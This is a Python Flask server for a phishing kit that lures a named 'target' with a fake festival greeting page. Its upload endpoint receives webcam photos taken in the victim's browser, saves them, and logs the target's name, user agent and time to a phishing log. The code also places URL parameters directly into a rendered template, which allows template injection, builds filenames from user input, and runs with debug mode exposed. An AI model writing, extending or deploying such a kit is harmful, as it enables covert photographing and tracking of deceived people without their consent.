from flask import Flask, request, render_template_string, send_from_directory
import base64
import os
from datetime import datetime
import json

app = Flask(__name__)

# Create uploads directory
UPLOAD_FOLDER = 'uploads'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

@app.route('/')
def index():
    festival = request.args.get('festival', 'Diwali')
    target = request.args.get('target', 'Friend')
    
    with open('index.html', 'r') as f:
        html_content = f.read()
    
    html_content = html_content.replace('{{festival_name}}', festival)
    html_content = html_content.replace('{{target_name}}', target)
    
    return render_template_string(html_content)

@app.route('/upload.php', methods=['POST'])
def upload_photo():
    try:
        photo_data = request.form['photo']
        target_name = request.form.get('target', 'Unknown')
        festival_name = request.form.get('festival', 'Festival')
        user_agent = request.form.get('userAgent', 'Unknown')
        timestamp = request.form.get('timestamp', datetime.now().isoformat())
        
        # Decode base64 image
        photo_data = photo_data.split(',')[1]
        filename = f"{UPLOAD_FOLDER}/{timestamp}_{target_name.replace(' ', '_')}.jpg"
        
        with open(filename, 'wb') as f:
            f.write(base64.b64decode(photo_data))
        
        # Log details
        log_entry = {
            'target': target_name,
            'festival': festival_name,
            'timestamp': timestamp,
            'user_agent': user_agent,
            'filename': filename
        }
        
        with open('phish_log.json', 'a') as f:
            f.write(json.dumps(log_entry) + '\n')
        
        print(f"[+] Photo captured from {target_name} - {filename}")
        
        return "OK"
    except Exception as e:
        print(f"Error: {e}")
        return "Error", 500

@app.route('/uploads/<filename>')
def uploaded_file(filename):
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)
